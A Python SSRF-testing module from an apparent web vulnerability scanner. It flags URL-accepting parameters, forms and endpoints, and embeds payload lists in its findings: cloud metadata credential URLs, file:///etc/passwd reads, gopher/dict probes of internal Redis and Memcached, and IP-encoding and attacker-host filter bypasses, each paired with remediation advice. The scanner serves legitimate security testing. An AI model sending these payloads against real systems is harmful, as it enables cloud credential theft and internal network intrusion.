"""
Active SSRF (Server-Side Request Forgery) Testing Module
Tests for SSRF vulnerabilities and demonstrates potential exploitation
"""

import requests
from bs4 import BeautifulSoup
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse, urljoin
import re

def test_ssrf_vulnerabilities(scanner):
    """
    Comprehensive SSRF testing
    """
    try:
        response = scanner.get_cached_response(scanner.target_url)
        if not response:
            return
        
        # Test URL parameters for SSRF
        _test_url_parameters_ssrf(scanner)
        
        # Test forms for SSRF
        _test_form_ssrf(scanner, response)
        
        # Detect SSRF-prone functionality
        _detect_ssrf_indicators(scanner, response)
        
        # Test common SSRF endpoints
        _test_common_ssrf_endpoints(scanner)
        
    except Exception as e:
        print(f"SSRF testing error: {e}")

def _test_url_parameters_ssrf(scanner):
    """Test URL parameters that might be vulnerable to SSRF"""
    parsed = urlparse(scanner.target_url)
    params = parse_qs(parsed.query)
    
    if not params:
        return
    
    # Parameters commonly vulnerable to SSRF
    ssrf_params = ['url', 'uri', 'path', 'dest', 'destination', 'redirect', 'link', 
                   'next', 'goto', 'target', 'file', 'load', 'fetch', 'src', 'source',
                   'callback', 'webhook', 'api', 'endpoint', 'proxy', 'domain', 'host']
    
    for param_name in params.keys():
        param_lower = param_name.lower()
        
        if any(ssrf_keyword in param_lower for ssrf_keyword in ssrf_params):
            param_value = params[param_name][0]
            
            scanner.add_finding(
                severity='HIGH',
                category='Server-Side Request Forgery',
                title=f'⚠️ Potential SSRF via URL Parameter: {param_name}',
                description=f'**CRITICAL SSRF VULNERABILITY INDICATOR**\n\n'
                           f'URL parameter "{param_name}" appears to accept URLs/paths:\n'
                           f'Current value: {param_value}\n\n'
                           f'**EXPLOITATION TECHNIQUES:**\n\n'
                           f'**1. Internal Network Scanning:**\n'
                           f'?{param_name}=http://127.0.0.1:22\n'
                           f'?{param_name}=http://127.0.0.1:3306\n'
                           f'?{param_name}=http://192.168.1.1/admin\n\n'
                           f'**2. Cloud Metadata Extraction (AWS):**\n'
                           f'?{param_name}=http://169.254.169.254/latest/meta-data/\n'
                           f'?{param_name}=http://169.254.169.254/latest/meta-data/iam/security-credentials/\n\n'
                           f'**3. File Protocol Access:**\n'
                           f'?{param_name}=file:///etc/passwd\n'
                           f'?{param_name}=file:///C:/Windows/System32/drivers/etc/hosts\n\n'
                           f'**4. Internal Service Discovery:**\n'
                           f'?{param_name}=http://localhost:6379  (Redis)\n'
                           f'?{param_name}=http://localhost:27017  (MongoDB)\n'
                           f'?{param_name}=http://localhost:9200  (Elasticsearch)\n\n'
                           f'**5. Bypass Filters:**\n'
                           f'?{param_name}=http://127.1  (Decimal IP)\n'
                           f'?{param_name}=http://0x7f.0x0.0x0.0x1  (Hex IP)\n'
                           f'?{param_name}=http://[::1]  (IPv6 localhost)\n'
                           f'?{param_name}=http://127.0.0.1@attacker.com\n'
                           f'?{param_name}=http://attacker.com#@127.0.0.1',
                url=scanner.target_url,
                remediation='CRITICAL FIXES:\n'
                           '1. Implement strict URL validation\n'
                           '2. Use allowlist of permitted domains\n'
                           '3. Block internal IP ranges (10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16, 127.0.0.0/8)\n'
                           '4. Disable file:// protocol\n'
                           '5. Block cloud metadata endpoints\n'
                           '6. Use DNS resolution validation\n'
                           '7. Implement request timeouts\n'
                           '8. Never trust user-supplied URLs'
            )

def _test_form_ssrf(scanner, response):
    """Test form inputs for SSRF vulnerabilities"""
    soup = BeautifulSoup(response.text, 'html.parser')
    forms = soup.find_all('form')
    
    ssrf_input_names = ['url', 'uri', 'link', 'source', 'callback', 'webhook', 
                        'feed', 'rss', 'api', 'endpoint', 'proxy', 'fetch']
    
    for form in forms:
        action = form.get('action', '')
        form_url = urljoin(scanner.target_url, action) if action else scanner.target_url
        
        # Check all inputs in the form
        inputs = form.find_all(['input', 'textarea'])
        vulnerable_inputs = []
        
        for input_tag in inputs:
            name = input_tag.get('name', '').lower()
            input_type = input_tag.get('type', 'text').lower()
            placeholder = input_tag.get('placeholder', '').lower()
            
            if input_type == 'url' or any(keyword in name for keyword in ssrf_input_names) or \
               any(keyword in placeholder for keyword in ssrf_input_names):
                vulnerable_inputs.append({
                    'name': input_tag.get('name'),
                    'type': input_type,
                    'placeholder': placeholder
                })
        
        if vulnerable_inputs:
            scanner.add_finding(
                severity='HIGH',
                category='Server-Side Request Forgery',
                title=f'SSRF-Vulnerable Form Inputs Detected',
                description=f'Form at {form_url} contains inputs that may be vulnerable to SSRF:\n\n' +
                           '\n'.join([f'- {inp["name"]} (type: {inp["type"]})' for inp in vulnerable_inputs]) +
                           f'\n\n**SSRF TESTING PAYLOADS:**\n\n'
                           f'Test these in the form fields:\n'
                           f'1. http://169.254.169.254/latest/meta-data/\n'
                           f'2. http://127.0.0.1:22\n'
                           f'3. http://localhost/admin\n'
                           f'4. file:///etc/passwd\n'
                           f'5. gopher://127.0.0.1:11211/  (Memcached)\n'
                           f'6. dict://127.0.0.1:6379/  (Redis)',
                url=form_url,
                remediation='Validate and sanitize URL inputs server-side',
                evidence={
                    'type': 'forms',
                    'count': len(vulnerable_inputs),
                    'forms': [{
                        'action': form_url,
                        'inputs': vulnerable_inputs,
                        'method': form.get('method', 'GET')
                    }]
                }
            )

def _detect_ssrf_indicators(scanner, response):
    """Detect functionality that commonly has SSRF vulnerabilities"""
    soup = BeautifulSoup(response.text, 'html.parser')
    text_content = response.text.lower()
    
    ssrf_indicators = {
        'url_shortener': ['shorten', 'short url', 'url shortener', 'tiny url'],
        'webhook': ['webhook', 'callback url', 'notification url'],
        'proxy': ['proxy', 'fetch url', 'load url', 'retrieve url'],
        'pdf_generator': ['pdf', 'generate pdf', 'export pdf', 'html to pdf'],
        'screenshot': ['screenshot', 'screen capture', 'web capture', 'snapshot'],
        'image_processing': ['fetch image', 'load image', 'import image', 'process image'],
        'rss_feed': ['rss', 'feed reader', 'subscribe', 'feed url'],
        'import_export': ['import from url', 'fetch data', 'load from url'],
        'oauth_redirect': ['redirect_uri', 'callback', 'oauth']
    }
    
    found_indicators = []
    
    for category, keywords in ssrf_indicators.items():
        for keyword in keywords:
            if keyword in text_content:
                found_indicators.append(category)
                break
    
    if found_indicators:
        scanner.add_finding(
            severity='MEDIUM',
            category='Server-Side Request Forgery',
            title=f'SSRF-Prone Functionality Detected: {", ".join(set(found_indicators))}',
            description=f'Page contains functionality commonly vulnerable to SSRF:\n\n' +
                       '\n'.join([f'- {cat.replace("_", " ").title()}' for cat in set(found_indicators)]) +
                       f'\n\n**WHY THIS IS RISKY:**\n\n'
                       f'These features typically make server-side HTTP requests based on user input,\n'
                       f'which can be exploited for SSRF if not properly validated.\n\n'
                       f'**EXPLOITATION SCENARIOS:**\n\n'
                       f'- **Port Scanning:** Scan internal network for open services\n'
                       f'- **Cloud Metadata:** Extract AWS/Azure credentials\n'
                       f'- **Internal APIs:** Access admin interfaces\n'
                       f'- **File Reading:** Access local files via file://\n'
                       f'- **Bypass Firewalls:** Use server as proxy to internal network',
            url=scanner.target_url,
            remediation='Each of these features needs SSRF protection:\n'
                       '1. Validate destination URLs against allowlist\n'
                       '2. Block private IP ranges\n'
                       '3. Use DNS resolution checks\n'
                       '4. Implement request signing/authentication'
        )

def _test_common_ssrf_endpoints(scanner):
    """Test common endpoints that might have SSRF vulnerabilities"""
    common_ssrf_endpoints = [
        '/api/fetch',
        '/api/proxy',
        '/webhook',
        '/callback',
        '/import',
        '/export',
        '/pdf',
        '/screenshot',
        '/preview',
        '/shorten',
        '/redirect',
        '/fetch-image',
        '/load-url'
    ]
    
    base_url = f"{scanner.parsed_url.scheme}://{scanner.parsed_url.netloc}"
    
    for endpoint in common_ssrf_endpoints:
        url = base_url + endpoint
        
        try:
            response = scanner.session.get(url, timeout=3, allow_redirects=False)
            
            if response.status_code in [200, 400, 401, 403]:
                scanner.add_finding(
                    severity='INFO',
                    category='Server-Side Request Forgery',
                    title=f'Potential SSRF Endpoint: {endpoint}',
                    description=f'Endpoint {url} returned HTTP {response.status_code}\n\n'
                               f'This endpoint name suggests it may perform server-side requests.\n\n'
                               f'**TEST FOR SSRF:**\n'
                               f'Try sending URL parameters like:\n'
                               f'- {url}?url=http://169.254.169.254/\n'
                               f'- {url}?target=http://127.0.0.1:22\n'
                               f'- {url}?dest=file:///etc/passwd',
                    url=url,
                    remediation='Test this endpoint for SSRF vulnerabilities'
                )
        except:
            pass

def _provide_ssrf_reference(scanner):
    """Provide SSRF exploitation reference"""
    scanner.add_finding(
        severity='INFO',
        category='Server-Side Request Forgery',
        title='SSRF Exploitation Reference Guide',
        description=f'**SSRF ATTACK VECTORS:**\n\n'
                   f'**1. Cloud Metadata Endpoints:**\n'
                   f'AWS: http://169.254.169.254/latest/meta-data/\n'
                   f'Google Cloud: http://metadata.google.internal/\n'
                   f'Azure: http://169.254.169.254/metadata/instance?api-version=2021-02-01\n'
                   f'DigitalOcean: http://169.254.169.254/metadata/v1/\n\n'
                   f'**2. Internal Network Scanning:**\n'
                   f'Common ports: 22, 80, 443, 3306, 5432, 6379, 8080, 9200, 27017\n'
                   f'Range: http://192.168.1.1-254\n\n'
                   f'**3. Protocol Exploitation:**\n'
                   f'file:///etc/passwd (Local file read)\n'
                   f'gopher://127.0.0.1:6379/... (Redis commands)\n'
                   f'dict://127.0.0.1:11211/ (Memcached)\n'
                   f'ldap://127.0.0.1:389/ (LDAP injection)\n\n'
                   f'**4. Filter Bypass Techniques:**\n'
                   f'Decimal IP: http://2130706433 (127.0.0.1)\n'
                   f'Octal IP: http://0177.0.0.1\n'
                   f'Hex IP: http://0x7f.0x0.0x0.0x1\n'
                   f'IPv6: http://[::1]\n'
                   f'URL shortener: http://bit.ly/internal-redirect\n'
                   f'DNS rebinding: Use domain that resolves to internal IP\n'
                   f'Open redirect: http://allowed.com/redirect?url=http://169.254.169.254\n\n'
                   f'**5. Blind SSRF Detection:**\n'
                   f'Use Burp Collaborator or webhook.site\n'
                   f'Check DNS logs for lookups\n'
                   f'Time-based detection (internal vs external response times)',
        url=scanner.target_url,
        remediation='Comprehensive SSRF prevention:\n'
                   '1. Use URL allowlist (never blocklist)\n'
                   '2. Validate protocol (only http/https)\n'
                   '3. Block private IP ranges\n'
                   '4. Disable unnecessary protocols\n'
                   '5. Use network segmentation\n'
                   '6. Implement DNS pinning\n'
                   '7. Use separate service for external requests\n'
                   '8. Log all outbound requests'
    )
